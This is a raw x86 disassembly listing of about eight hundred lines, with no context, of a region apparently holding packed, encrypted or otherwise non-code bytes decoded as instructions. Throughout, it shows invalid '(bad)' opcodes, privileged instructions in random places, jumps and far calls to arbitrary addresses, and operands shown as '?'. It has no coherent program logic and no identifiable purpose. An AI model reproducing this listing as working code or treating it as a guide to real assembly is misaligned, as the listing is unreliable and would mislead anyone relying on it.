  4239ff:	jp     0x4239c1
  423a01:	pop    es
  423a02:	repnz scas eax,DWORD PTR es:[edi]
  423a04:	jmp    0xbab0d29f
  423a09:	test   eax,0x3942e6b8
  423a0e:	and    edi,edi
  423a10:	arpl   WORD PTR [ecx+ebx*8+0x63a0c1f7],si
  423a17:	mov    cr3,esp
  423a1a:	lds    edi,FWORD PTR [edi-0x3e]
  423a1d:	push   ds
  423a1e:	push   cs
  423a1f:	je     0x423a42
  423a21:	jb     0x4239bd
  423a23:	fadd   DWORD PTR gs:[ecx]
  423a26:	scas   eax,DWORD PTR es:[edi]
  423a27:	rcl    dh,1
  423a29:	int3   
  423a2a:	sbb    BYTE PTR [eax+0x4d91e0df],ch
  423a30:	hlt    
  423a31:	jg     0x4239c5
  423a33:	mov    cl,0x89
  423a35:	int    0xe7
  423a37:	call   0x2e1332f4
  423a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a3d:	(bad)  [ebx-0x49]
  423a40:	sub    BYTE PTR [ebp+0x72],ch
  423a43:	adc    esi,esp
  423a45:	mov    al,ds:0x3368d388
  423a4a:	ret    0x14e0
  423a4d:	fist   DWORD PTR [ebx]
  423a4f:	mov    esi,0x566be00c
  423a54:	(bad)  
  423a55:	call   0x97bac068
  423a5a:	out    dx,eax
  423a5b:	mov    ds:0x9e449c00,eax
  423a60:	std    
  423a61:	into   
  423a62:	sahf   
  423a63:	sbb    DWORD PTR [eax-0x6e],ecx
  423a66:	leave  
  423a67:	outs   dx,BYTE PTR ds:[esi]
  423a68:	xchg   esp,eax
  423a69:	arpl   WORD PTR [edi],bx
  423a6b:	shl    edi,cl
  423a6d:	dec    ecx
  423a6e:	or     dl,BYTE PTR [edi+0x70]
  423a71:	cmp    al,0x5e
  423a73:	outs   dx,DWORD PTR ds:[esi]
  423a74:	mov    eax,ds:0x221a4f0b
  423a79:	jmp    0xb3186f4a
  423a7e:	mov    edx,gs
  423a80:	shl    BYTE PTR [ebx],cl
  423a82:	enter  0x9b2a,0x38
  423a86:	fstp   DWORD PTR [ebp+0x59]
  423a89:	xrelease mov BYTE PTR [eax-0x5664f915],dh
  423a90:	iret   
  423a91:	sub    al,0xc5
  423a93:	or     eax,ebp
  423a95:	out    dx,al
  423a96:	in     al,dx
  423a97:	sahf   
  423a98:	mov    ebx,DWORD PTR [ecx+0x22]
  423a9b:	sbb    eax,0xbf610f5
  423aa0:	pop    esp
  423aa1:	push   ds
  423aa2:	adc    edx,ecx
  423aa4:	outs   dx,BYTE PTR ds:[esi]
  423aa5:	iret   
  423aa6:	mov    eax,ds:0x4db5ce37
  423aab:	jnp    0x423a63
  423aad:	in     al,0x5e
  423aaf:	cmp    dl,al
  423ab1:	rcr    BYTE PTR [esi],1
  423ab3:	es pop edx
  423ab5:	es inc ecx
  423ab7:	xor    eax,0xa945bc2f
  423abc:	push   ss
  423abd:	xchg   esp,eax
  423abe:	adc    BYTE PTR [esi-0x50],bh
  423ac1:	sub    BYTE PTR ds:0x55952050,al
  423ac7:	inc    edi
  423ac8:	loopne 0x423a93
  423aca:	dec    ebx
  423acb:	xchg   ebp,eax
  423acc:	jmp    0x954868ed
  423ad1:	aas    
  423ad2:	and    dh,ch
  423ad4:	pop    esp
  423ad5:	ret    
  423ad6:	jo     0x423ad7
  423ad8:	xor    ah,BYTE PTR [esi]
  423ada:	bound  esi,QWORD PTR [ebp+0x6b706b4e]
  423ae0:	stos   DWORD PTR es:[edi],eax
  423ae1:	jl     0x423b4b
  423ae3:	ins    BYTE PTR es:[edi],dx
  423ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ae5:	adc    bh,BYTE PTR [eax+0x62]
  423ae8:	stc    
  423ae9:	xchg   esi,eax
  423aea:	fld    TBYTE PTR [edx]
  423aec:	mov    esp,0x50eed6f5
  423af1:	into   
  423af2:	fnsave [eax-0x5f04748f]
  423af8:	sbb    dh,ch
  423afa:	sahf   
  423afb:	fisub  DWORD PTR [ebx]
  423afd:	jmp    0x423ade
  423aff:	in     al,0x67
  423b01:	ror    BYTE PTR [edx+0x252f4e03],0xd7
  423b08:	push   esi
  423b09:	mov    ds:0xe94aa506,eax
  423b0e:	mov    eax,ds:0xf9a445c0
  423b13:	outs   dx,BYTE PTR ds:[esi]
  423b14:	push   eax
  423b15:	and    BYTE PTR [ebx-0x2f37e414],0xf3
  423b1c:	pop    edi
  423b1d:	adc    ah,BYTE PTR [edx-0x76]
  423b20:	xchg   esi,eax
  423b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b22:	je     0x423b49
  423b24:	(bad)  
  423b25:	inc    edi
  423b26:	or     DWORD PTR [ecx],ebx
  423b28:	(bad)  
  423b2a:	scas   al,BYTE PTR es:[edi]
  423b2b:	adc    BYTE PTR [ebx-0x7aae3f9d],ah
  423b31:	arpl   WORD PTR [eax-0x48],ax
  423b34:	gs inc edx
  423b36:	xchg   BYTE PTR [ecx],ch
  423b38:	adc    al,0xd6
  423b3a:	fisubr DWORD PTR [edi+0x49]
  423b3d:	adc    al,0x91
  423b3f:	xchg   ebp,eax
  423b40:	hlt    
  423b41:	xchg   esi,edx
  423b43:	dec    ebp
  423b44:	pushf  
  423b45:	adc    eax,0xa4a9814e
  423b4a:	int3   
  423b4b:	push   edi
  423b4c:	xchg   ebp,eax
  423b4d:	adc    eax,0x519a2e6e
  423b52:	es clc 
  423b54:	mov    cl,0xd6
  423b56:	mov    ah,0x3c
  423b58:	push   0xffffffcb
  423b5a:	pop    edi
  423b5b:	sub    DWORD PTR [ebx-0x6],eax
  423b5e:	pop    ss
  423b5f:	and    BYTE PTR [eax],al
  423b61:	popf   
  423b62:	jle    0x423af4
  423b64:	cdq    
  423b65:	scas   eax,DWORD PTR es:[edi]
  423b66:	dec    edi
  423b67:	cld    
  423b68:	xchg   edx,eax
  423b69:	jo     0x423bdb
  423b6b:	adc    esi,DWORD PTR [edx-0x34]
  423b6e:	pop    esi
  423b6f:	dec    esi
  423b70:	pusha  
  423b71:	push   edx
  423b72:	ins    BYTE PTR es:[edi],dx
  423b73:	out    dx,al
  423b74:	xor    edi,edi
  423b76:	sbb    edi,DWORD PTR [ecx+edx*4+0x69f36a80]
  423b7d:	adc    cl,ch
  423b7f:	cli    
  423b80:	xor    BYTE PTR [edx+ebx*2-0x60d16870],0x29
  423b88:	add    al,0x66
  423b8a:	push   cs
  423b8b:	rcr    BYTE PTR [edi+0x21],0x48
  423b8f:	inc    esi
  423b90:	fs sar ebp,0x18
  423b94:	mov    esi,0xf1753855
  423b99:	xchg   ecx,eax
  423b9a:	(bad)  
  423b9b:	push   0x74
  423b9d:	cmp    bh,BYTE PTR [ebp+0x3b279c9c]
  423ba3:	aaa    
  423ba4:	lock jle 0x423b3a
  423ba7:	jns    0x423b86
  423ba9:	jno    0x423bec
  423bab:	mov    dh,0x61
  423bad:	inc    ebx
  423bae:	adc    ebx,ebp
  423bb0:	mov    dh,0x7
  423bb2:	pop    eax
  423bb3:	add    eax,esp
  423bb5:	(bad)  
  423bb6:	mov    edx,0xa177118a
  423bbb:	ret    0xea80
  423bbe:	sub    dh,BYTE PTR [ebp+0x47]
  423bc1:	bound  eax,QWORD PTR [eax+0x59]
  423bc4:	add    ebp,DWORD PTR [ecx]
  423bc6:	test   edi,0x31153982
  423bcc:	aad    0xfb
  423bce:	mov    WORD PTR ds:0x95931f90,ds
  423bd4:	adc    eax,0xf50fb004
  423bd9:	dec    BYTE PTR [edx]
  423bdb:	add    eax,0x1698ec28
  423be0:	fst    DWORD PTR [ecx-0x31]
  423be3:	imul   eax,DWORD PTR [esp+esi*2],0xffffffc1
  423be7:	icebp  
  423be8:	mov    esi,DWORD PTR [ebp-0x4a4d1974]
  423bee:	inc    ebx
  423bef:	sahf   
  423bf0:	popf   
  423bf1:	mov    ebx,0xb356b140
  423bf6:	xor    edi,DWORD PTR [ebx]
  423bf8:	ja     0x423c52
  423bfa:	xor    eax,DWORD PTR [eax]
  423bfc:	mov    esi,0x339452d6
  423c01:	mov    esi,0x4f047897
  423c06:	fidiv  WORD PTR [ebp+0x2b4670ac]
  423c0c:	xor    BYTE PTR [eax+0x3a],0x64
  423c10:	lods   al,BYTE PTR ds:[esi]
  423c11:	shl    BYTE PTR [ecx+ebp*2-0x2c],0x4
  423c16:	jle    0x423c2d
  423c18:	mov    al,0x89
  423c1a:	sub    ah,ch
  423c1c:	dec    ebx
  423c1d:	pop    ebx
  423c1e:	add    al,0xc6
  423c20:	cld    
  423c21:	lods   eax,DWORD PTR ds:[esi]
  423c22:	jp     0x423c87
  423c24:	fild   DWORD PTR [ebp-0x53]
  423c27:	sbb    dh,bh
  423c29:	adc    DWORD PTR [ebx+0x1f],0x70
  423c2d:	retf   
  423c2e:	lds    ebx,FWORD PTR [edx+0x23]
  423c31:	scas   al,BYTE PTR es:[edi]
  423c32:	push   edi
  423c33:	pop    ecx
  423c34:	pop    esi
  423c35:	addr16 cdq 
  423c37:	in     eax,dx
  423c38:	sub    dh,cl
  423c3a:	sbb    al,0x13
  423c3c:	xchg   DWORD PTR [eax+0x3a4fc8],edx
  423c42:	rol    DWORD PTR [eax+edx*4+0x2d],0x9d
  423c47:	(bad)  
  423c48:	idiv   DWORD PTR [edi+0x40]
  423c4b:	and    ah,BYTE PTR [eax]
  423c4d:	pop    eax
  423c4e:	push   ss
  423c4f:	je     0x423c2f
  423c51:	jg     0x423c8d
  423c53:	cld    
  423c54:	cwde   
  423c55:	leave  
  423c56:	mov    ebp,0xc0302fde
  423c5b:	dec    esi
  423c5c:	sub    eax,DWORD PTR ds:0x8bc25b86
  423c62:	int    0xde
  423c64:	clc    
  423c65:	shl    BYTE PTR [ebx+0x42921283],1
  423c6b:	(bad)  
  423c6c:	push   0x3d
  423c6e:	sub    eax,0x44551118
  423c73:	pop    edx
  423c74:	inc    ebx
  423c75:	mov    al,ds:0xdf6f7f8d
  423c7a:	rcl    BYTE PTR [eax+0x2d8849cb],1
  423c80:	shl    BYTE PTR [edx],0x95
  423c83:	mov    al,ds:0x25428931
  423c88:	mov    ecx,0xad9be3c3
  423c8d:	sbb    DWORD PTR [ebp+0x36],edi
  423c90:	adc    ch,BYTE PTR ds:0x8603c395
  423c96:	add    eax,0xbac7a5ec
  423c9b:	push   0xffffffd1
  423c9d:	xor    DWORD PTR [esi+0x7057fff],esp
  423ca3:	inc    ecx
  423ca4:	xchg   edx,eax
  423ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ca6:	push   0x4d
  423ca8:	outs   dx,DWORD PTR ds:[esi]
  423ca9:	fcomp  QWORD PTR [ebx+ebp*2]
  423cac:	(bad)  
  423cad:	test   ebp,0x9a562bf8
  423cb3:	arpl   bp,dx
  423cb5:	dec    edx
  423cb6:	add    dh,BYTE PTR cs:[ecx]
  423cb9:	cwde   
  423cba:	xchg   edx,eax
  423cbb:	and    eax,0xcef36d1
  423cc0:	aad    0xe2
  423cc2:	jno    0x423d3f
  423cc4:	lds    esi,FWORD PTR [ebx+0x2b]
  423cc7:	mov    ax,0x9dcf
  423ccb:	mul    edi
  423ccd:	jno    0x423cf7
  423ccf:	scas   eax,DWORD PTR es:[edi]
  423cd0:	data16 int 0x58
  423cd3:	nop
  423cd4:	les    edi,FWORD PTR [eax-0x7c]
  423cd7:	loopne 0x423d28
  423cd9:	popa   
  423cda:	test   eax,0x24f84524
  423cdf:	inc    edi
  423ce0:	push   ebx
  423ce1:	jge    0x423cc4
  423ce3:	push   edx
  423ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ce5:	pushf  
  423ce6:	inc    ebx
  423ce7:	adc    esp,ebx
  423ce9:	sbb    al,0x9a
  423ceb:	mov    esp,0x64f75d10
  423cf0:	je     0x423d19
  423cf2:	and    al,0xc5
  423cf4:	ss aaa 
  423cf6:	ds fs xchg edx,eax
  423cf9:	outs   dx,BYTE PTR ds:[esi]
  423cfa:	adc    dl,0xe8
  423cfd:	(bad)  
  423cfe:	es push edx
  423d00:	push   ebp
  423d02:	retf   
  423d03:	daa    
  423d04:	cmp    bh,BYTE PTR [eax-0x41]
  423d07:	or     eax,0xf12d4f2e
  423d0c:	inc    ebx
  423d0d:	sub    esi,DWORD PTR [ebx+0x1c]
  423d10:	mov    al,ds:0x32baca73
  423d15:	jae    0x423d6b
  423d17:	pop    ebp
  423d18:	jg     0x423d48
  423d1a:	or     edi,DWORD PTR [esi+0xa]
  423d1d:	ud2    
  423d1f:	inc    ebp
  423d20:	mov    ebp,0xdfa60ea4
  423d25:	and    eax,0x540aa7ec
  423d2a:	cmp    eax,0x66badb6b
  423d2f:	jo     0x423d7a
  423d31:	sub    al,0xc
  423d33:	popa   
  423d34:	cwde   
  423d35:	cli    
  423d36:	stos   DWORD PTR es:[edi],eax
  423d37:	dec    ebp
  423d38:	fs call 0x5f24:0x5847a801
  423d40:	cld    
  423d41:	dec    esi
  423d42:	add    DWORD PTR [edi-0x3bc97d24],edi
  423d48:	aad    0xf4
  423d4a:	sbb    al,0x80
  423d4c:	into   
  423d4d:	stos   DWORD PTR es:[edi],eax
  423d4e:	rcr    al,0xad
  423d51:	mov    dl,0x45
  423d53:	jae    0x423d27
  423d55:	pop    es
  423d56:	test   DWORD PTR [ecx-0x3d8aece4],ebp
  423d5c:	jb     0x423da2
  423d5e:	ror    DWORD PTR [eax-0x4748d900],cl
  423d64:	cld    
  423d65:	xor    esp,DWORD PTR [bp+di+0x493b]
  423d6a:	(bad)  [eax+0x53]
  423d6d:	mov    ?,WORD PTR [edi]
  423d6f:	stos   DWORD PTR es:[edi],eax
  423d70:	push   0xfffffff1
  423d72:	int    0xb1
  423d74:	call   FWORD PTR [edi-0x24eff80d]
  423d7a:	and    bh,BYTE PTR cs:[edi-0x22]
  423d7e:	adc    al,0xe5
  423d80:	adc    edx,DWORD PTR [edx]
  423d82:	(bad)  
  423d83:	sub    al,0x96
  423d85:	mov    DWORD PTR [ecx+0x1ed3eaa8],esp
  423d8b:	push   ds
  423d8c:	pop    es
  423d8d:	mov    BYTE PTR [eax-0x3453ef3d],ah
  423d93:	jns    0x423d54
  423d95:	jmp    0x423d74
  423d97:	xor    eax,0xb9326b59
  423d9c:	fwait
  423d9d:	adc    esi,DWORD PTR [eax]
  423d9f:	push   ebx
  423da0:	push   ss
  423da1:	xchg   DWORD PTR [ebx+0x6b],ecx
  423da4:	lea    edi,[ecx+ebp*1]
  423da7:	loope  0x423ddc
  423da9:	push   eax
  423daa:	out    dx,eax
  423dab:	adc    al,0x86
  423dad:	arpl   WORD PTR [ebx-0x39d15eda],si
  423db3:	sub    ch,BYTE PTR [edi-0x10f3769]
  423db9:	pop    ds
  423dba:	es push edx
  423dbc:	cmc    
  423dbd:	jmp    0x423dbd
  423dbf:	out    dx,eax
  423dc0:	retf   
  423dc1:	inc    eax
  423dc2:	aas    
  423dc3:	aam    0x57
  423dc5:	mov    edi,ecx
  423dc7:	xor    BYTE PTR [edi],cl
  423dc9:	add    al,BYTE PTR [edx]
  423dcb:	jl     0x423d89
  423dcd:	scas   eax,DWORD PTR es:[edi]
  423dce:	test   DWORD PTR [eax],ecx
  423dd0:	dec    esi
  423dd1:	icebp  
  423dd2:	sahf   
  423dd3:	inc    esi
  423dd4:	mov    eax,ds:0x5935819a
  423dd9:	adc    al,0xa8
  423ddb:	adc    ah,dl
  423ddd:	sbb    DWORD PTR [esi+0x37088fd],0xffffffb5
  423de4:	mov    dh,0x76
  423de6:	imul   ecx,edi,0xb64e47a2
  423dec:	lods   eax,DWORD PTR ds:[esi]
  423ded:	mov    al,0xee
  423def:	add    bl,dl
  423df1:	call   0xdf83:0xf82d
  423df7:	mov    esi,0xd3471d43
  423dfc:	xchg   edx,eax
  423dfd:	and    eax,0x9603e70f
  423e02:	lds    ebx,FWORD PTR [ebp+0x76]
  423e05:	inc    ebp
  423e06:	nop
  423e07:	(bad)  [ebp+0x20dde00a]
  423e0d:	xor    al,0xef
  423e0f:	add    DWORD PTR [esi+0x48b440e3],edi
  423e15:	sti    
  423e16:	test   eax,0xb0a31ab4
  423e1b:	loope  0x423dc4
  423e1d:	ds icebp 
  423e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e20:	jae    0x423de8
  423e22:	adc    DWORD PTR [edx],esp
  423e24:	sbb    dh,ah
  423e26:	mov    eax,?
  423e28:	out    0x5b,al
  423e2a:	scas   eax,DWORD PTR es:[edi]
  423e2b:	dec    ebp
  423e2c:	mov    ds:0x5add9e36,al
  423e31:	scas   eax,DWORD PTR es:[edi]
  423e32:	test   DWORD PTR [edi-0x2c],edi
  423e35:	adc    eax,0x5be2bc7c
  423e3a:	ds adc al,0x5d
  423e3d:	dec    ebp
  423e3e:	enter  0x4e39,0xa2
  423e42:	(bad)  
  423e43:	es add eax,0x9658955c
  423e49:	call   0x837dffe7
  423e4e:	jno    0x423df0
  423e50:	xor    DWORD PTR [edx+0x386d03da],edi
  423e56:	sub    eax,0x8510bbb3
  423e5b:	retf   
  423e5c:	xchg   edi,eax
  423e5d:	fdivrp st(3),st
  423e5f:	mov    bh,0xd2
  423e61:	pushf  
  423e62:	cwde   
  423e63:	push   eax
  423e64:	pop    ebx
  423e65:	mov    ss,WORD PTR [ebp-0x22fd184e]
  423e6b:	outs   dx,DWORD PTR ds:[esi]
  423e6c:	mov    bl,0xb1
  423e6e:	ins    BYTE PTR es:[edi],dx
  423e6f:	call   0xfb58:0x4ac5fd88
  423e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e77:	mov    ebx,0x152b0724
  423e7c:	imul   esi,DWORD PTR [ecx],0xfffffffe
  423e7f:	xor    BYTE PTR [esi],cl
  423e81:	jno    0x423e15
  423e83:	les    edi,FWORD PTR [eax+0x5f]
  423e86:	jecxz  0x423e92
  423e88:	sub    esi,edx
  423e8a:	or     eax,0xaee71312
  423e8f:	mov    dh,0xab
  423e91:	(bad)  
  423e92:	mov    ds:0xfb550a68,al
  423e97:	(bad)  
  423e98:	sub    esi,esp
  423e9a:	repnz in eax,0xfc
  423e9d:	leave  
  423e9e:	(bad)  
  423e9f:	add    BYTE PTR [edx+0xb],dh
  423ea2:	int3   
  423ea3:	test   dl,dh
  423ea5:	sbb    cl,bl
  423ea7:	out    0x65,eax
  423ea9:	push   ecx
  423eaa:	(bad)  
  423eab:	sbb    ebx,DWORD PTR [edi]
  423ead:	fsub   DWORD PTR [esi+ebp*8]
  423eb0:	dec    eax
  423eb1:	jg     0x423f20
  423eb3:	mov    edi,0xab31618c
  423eb8:	sbb    esp,DWORD PTR [eax+0x4c]
  423ebb:	xchg   BYTE PTR [esp+esi*2-0x76edc5ef],bl
  423ec2:	push   0xf
  423ec4:	out    dx,eax
  423ec5:	xlat   BYTE PTR ds:[ebx]
  423ec6:	mov    bh,0xa1
  423ec8:	out    0x8,eax
  423eca:	pop    ss
  423ecb:	inc    ebp
  423ecc:	sbb    dx,WORD PTR [esi+ebx*1]
  423ed0:	mov    bl,0xc
  423ed2:	sub    esi,DWORD PTR ds:0x110a6133
  423ed8:	push   0x72
  423eda:	test   BYTE PTR [edi],dh
  423edc:	retf   
  423edd:	inc    eax
  423ede:	adc    bl,BYTE PTR [eax-0x20890da5]
  423ee4:	xchg   DWORD PTR [ecx+0x20],edx
  423ee7:	js     0x423f30
  423ee9:	add    BYTE PTR [ebx],0x33
  423eec:	sbb    BYTE PTR [eax+0x51],cl
  423eef:	es mov es,ebp
  423ef2:	sahf   
  423ef3:	mov    ah,0xd0
  423ef5:	xchg   DWORD PTR [edi+0x9],edi
  423ef8:	and    cl,ch
  423efa:	push   ds
  423efb:	jb     0x423ef0
  423efd:	std    
  423efe:	cld    
  423eff:	imul   BYTE PTR [edi+0x2713796d]
  423f05:	and    al,0xa5
  423f07:	pop    esp
  423f08:	aam    0x7a
  423f0a:	lock xor ecx,esp
  423f0d:	out    dx,eax
  423f0e:	fsub   DWORD PTR [ecx+0x35b903b8]
  423f14:	out    0x33,eax
  423f16:	(bad)  
  423f17:	push   ss
  423f18:	and    BYTE PTR [ecx-0x35],bl
  423f1b:	jmp    0x423f6b
  423f1d:	dec    ebp
  423f1e:	mov    ah,0x4d
  423f20:	cs mov edi,0x7d51baa1
  423f26:	jmp    0x641a6c81
  423f2b:	dec    esp
  423f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f2d:	sbb    ebx,esi
  423f2f:	in     eax,dx
  423f30:	in     al,0x1e
  423f32:	fiadd  DWORD PTR [edi+eiz*8]
  423f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f36:	sub    eax,0x57f0be89
  423f3b:	cwde   
  423f3c:	je     0x423fa0
  423f3e:	dec    ecx
  423f3f:	sbb    DWORD PTR [edx-0x5cc0b836],edi
  423f45:	cdq    
  423f46:	or     eax,DWORD PTR [edi-0x60e15b8f]
  423f4c:	adc    al,0x2e
  423f4e:	rol    BYTE PTR [esi+ebx*4],cl
  423f51:	mov    ch,0x5e
  423f53:	mov    dl,0xc
  423f55:	arpl   WORD PTR [ecx+0x49],di
  423f58:	leave  
  423f59:	pop    edx
  423f5a:	or     ah,ch
  423f5c:	aad    0xff
  423f5e:	pusha  
  423f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f60:	jo     0x423f80
  423f62:	(bad)  [esi-0x44400568]
  423f68:	lahf   
  423f69:	(bad)  [ecx+0x34966824]
  423f6f:	xor    esi,DWORD PTR [ecx+0x1f]
  423f72:	mov    eax,ds:0x89eb6de5
  423f77:	fcomp  QWORD PTR [eax-0x7a]
  423f7a:	sub    DWORD PTR [eax+0x546f5df7],esp
  423f80:	mov    ch,0x20
  423f82:	fidivr DWORD PTR [ecx+0x1f8cb6f1]
  423f88:	jne    0x423f16
  423f8a:	cmp    al,0x7a
  423f8c:	cmc    
  423f8d:	lea    eax,[esi]
  423f8f:	mov    cs,ecx
  423f91:	icebp  
  423f92:	test   DWORD PTR [eax+0x4b6334fc],eax
  423f98:	fiadd  WORD PTR [edi]
  423f9a:	add    DWORD PTR [edx*2-0x4a04da05],0x4cd190dc
  423fa5:	mov    al,0x2
  423fa7:	and    eax,0x407b9151
  423fac:	and    ebp,eax
  423fae:	jle    0x423fdd
  423fb0:	stc    
  423fb1:	sbb    DWORD PTR [ebx-0x43],ebx
  423fb4:	mov    ds:0x91e52281,al
  423fb9:	hlt    
  423fba:	outs   dx,DWORD PTR ds:[esi]
  423fbb:	mov    ds:0xfd2beeab,eax
  423fc0:	push   es
  423fc1:	sbb    BYTE PTR [edi+0x53],al
  423fc4:	add    DWORD PTR [edi],ebx
  423fc6:	cs dec esi
  423fc8:	repz popf 
  423fca:	mov    ebp,0xe30ea233
  423fcf:	mov    ch,al
  423fd1:	add    dh,BYTE PTR [ebp+0x2b]
  423fd4:	mov    es,WORD PTR [esi]
  423fd6:	call   0x363ecc43
  423fdb:	lock pop es
  423fdd:	or     bl,BYTE PTR ds:0x4f5b90e2
  423fe3:	inc    edx
  423fe4:	shl    bh,1
  423fe6:	ja     0x423f8b
  423fe8:	adc    al,BYTE PTR [edx-0x6a]
  423feb:	dec    ebx
  423fec:	dec    ebx
  423fed:	gs pop ebx
  423fef:	call   0x865d588d
  423ff4:	mov    ecx,0x13e36ef2
  423ff9:	mov    bl,dl
  423ffb:	cdq    
  423ffc:	inc    esp
  423ffd:	sar    DWORD PTR [ecx+0x4c7aa523],0x5
  424004:	xchg   BYTE PTR [edx-0xb],dl
  424007:	(bad)  
  424008:	adc    esi,DWORD PTR [ecx]
  42400a:	daa    
  42400b:	push   ds
  42400c:	in     al,0x26
  42400e:	stc    
  42400f:	cli    
  424010:	cmp    al,0x6e
  424012:	xchg   BYTE PTR [ecx],cl
  424014:	add    esp,ecx
  424016:	iret   
  424017:	stos   BYTE PTR es:[edi],al
  424018:	aaa    
  424019:	sbb    ebp,esp
  42401b:	imul   ebx,DWORD PTR [edi-0x16],0x3c
  42401f:	cmp    BYTE PTR [ebx-0x31],0x28
  424023:	int3   
  424024:	stos   DWORD PTR es:[edi],eax
  424025:	push   ecx
  424026:	mov    bh,ah
  424028:	rcr    ch,0xef
  42402b:	fiadd  DWORD PTR [ecx-0x6e]
  42402e:	stos   DWORD PTR es:[edi],eax
  42402f:	inc    ebx
  424030:	dec    esi
  424031:	cld    
  424032:	adc    dl,bl
  424034:	mov    bl,0x9e
  424036:	rcr    BYTE PTR [edi+0x71d3ef62],cl
  42403c:	ins    BYTE PTR es:[edi],dx
  42403d:	pop    DWORD PTR [ebp+0xd37631a]
  424043:	push   edi
  424044:	jno    0x424058
  424046:	ss (bad) 
  424049:	shl    BYTE PTR [edi+0x7671b7d0],cl
  42404f:	push   es
  424050:	arpl   WORD PTR [ecx-0x279b403a],bp
  424056:	and    eax,0xf9bc3a62
  42405b:	int    0xd3
  42405d:	or     al,0xb6
  42405f:	stos   DWORD PTR es:[edi],eax
  424060:	lods   al,BYTE PTR ds:[esi]
  424061:	outs   dx,BYTE PTR ds:[esi]
  424062:	dec    ecx
  424063:	fwait
  424064:	jmp    0x424037
  424066:	jg     0x424056
  424068:	pop    ecx
  424069:	push   ds
  42406a:	sbb    ah,BYTE PTR [ecx+ecx*1]
  42406d:	out    dx,eax
  42406e:	cli    
  42406f:	inc    ebx
  424070:	retf   0x5414
  424073:	pop    ds
  424074:	jge    0x4240c8
  424076:	pop    esi
  424077:	jge    0x424059
  424079:	in     al,dx
  42407a:	xchg   esi,eax
  42407b:	(bad)  
  42407c:	call   0xb6307941
  424081:	inc    al
  424083:	mov    esp,DWORD PTR [ebx]
  424085:	mov    esi,0x453e8381
  42408a:	call   DWORD PTR [ebx+0x4]
  42408d:	call   0xea12130
  424092:	ret    
  424093:	add    esi,ebx
  424095:	enter  0x90a9,0x4b
  424099:	mov    ebx,0x9f9b85e3
  42409e:	xchg   DWORD PTR [ebx+0x48],ebp
  4240a1:	jno    0x42407d
  4240a3:	lock aaa 
  4240a5:	jae    0x424092
  4240a7:	(bad)  
  4240aa:	stc    
  4240ab:	fiadd  DWORD PTR [ebx+edx*8+0x67]
  4240af:	rol    DWORD PTR ds:0xfe80021,cl
  4240b5:	cmp    eax,0xbfbb84de
  4240ba:	lea    esi,[ebx-0x652b2dc1]
  4240c0:	adc    ebp,DWORD PTR [ebx+eiz*4-0x64f4942b]
  4240c7:	jecxz  0x424135
  4240c9:	adc    BYTE PTR [ebx],dh
  4240cb:	or     eax,0xa0f8e5a5
  4240d0:	fdiv   QWORD PTR [ebp-0x6dffb866]
  4240d6:	or     eax,0xa0f3a538
  4240db:	aad    0x7c
  4240dd:	adc    esi,esp
  4240df:	fmul   QWORD PTR [eax]
  4240e1:	sbb    BYTE PTR [esi],bl
  4240e3:	cmc    
  4240e4:	stos   BYTE PTR es:[edi],al
  4240e5:	jmp    0xf99a:0x5e6fefef
  4240ec:	cli    
  4240ed:	mov    eax,0x60df3e2b
  4240f2:	xor    edi,DWORD PTR [edi+0x5eba7f05]
  4240f8:	inc    edx
  4240f9:	or     al,0xd6
  4240fb:	mov    bl,0xa6
  4240fd:	mov    ebp,0x350a78b
  424102:	pop    ecx
  424103:	cwde   
  424104:	popf   
  424105:	dec    ebx
  424106:	imul   edi,edx,0x70
  424109:	xchg   esp,eax
  42410a:	repz push ecx
  42410c:	mov    ds:0x6bb15401,eax
  424111:	or     bh,cl
  424113:	jg     0x4240e2
  424115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424116:	fdiv   DWORD PTR [esi+0x1d]
  424119:	sub    ebx,edx
  42411b:	xchg   BYTE PTR [edi],al
  42411d:	popa   
  42411e:	ins    DWORD PTR es:[edi],dx
  42411f:	fdivrp st(0),st
  424121:	dec    eax
  424122:	add    BYTE PTR [ebx-0x6e636c0],bl
  424128:	mov    eax,0xd6c3f5c3
  42412d:	sbb    dh,BYTE PTR [ecx]
  42412f:	nop
  424130:	xchg   edi,eax
  424131:	mov    bl,0x73
  424133:	add    edx,DWORD PTR [ecx-0x58]
  424136:	inc    ebx
  424137:	outs   dx,BYTE PTR ds:[esi]
  424138:	clc    
  424139:	mov    ah,dh
  42413b:	add    BYTE PTR [edx+ebp*4-0x6e51e333],al
  424142:	mov    al,0x6a
  424144:	jge    0x424105
  424146:	fst    DWORD PTR [edx+0xd]
  424149:	rcr    BYTE PTR [ecx],cl
  42414b:	cmp    dh,BYTE PTR [ecx]
  42414d:	push   ebx
  42414e:	adc    eax,0x4495f0e3
  424153:	inc    esp
  424154:	xchg   esp,eax
  424155:	ret    0x5f4f
  424158:	add    al,BYTE PTR [ecx+edx*8+0x1b0d7be6]
  42415f:	cmp    al,0x20
  424161:	test   DWORD PTR [esi],eax
  424163:	push   esp
  424164:	cld    
  424165:	pop    ebx
  424166:	xor    ebp,DWORD PTR [edx+0x66]
  424169:	daa    
  42416a:	icebp  
  42416b:	loope  0x424184
  42416d:	out    0x77,al
  42416f:	or     edx,DWORD PTR [eax]
  424171:	xchg   ecx,eax
  424172:	and    esp,edi
  424174:	data16 (bad) 
  424177:	in     eax,0x99
  424179:	xchg   esi,eax
  42417a:	mov    cl,0x1e
  42417c:	cmp    DWORD PTR [ebx],ebp
  42417e:	stos   DWORD PTR es:[edi],eax
  42417f:	shl    BYTE PTR [ebx],cl
  424181:	inc    edx
  424182:	and    esp,ecx
  424184:	mov    ebx,0x885e365d
  424189:	out    0x1c,al
  42418b:	jne    0x4241b7
  42418d:	xor    al,0x78
  42418f:	out    dx,al
  424190:	sbb    dl,dh
  424192:	fcomp  QWORD PTR ds:0x62aa1bc8
  424198:	or     al,0x10
  42419a:	cmp    esi,DWORD PTR [edx]
  42419c:	das    
  42419d:	mov    WORD PTR [edi-0x70],gs
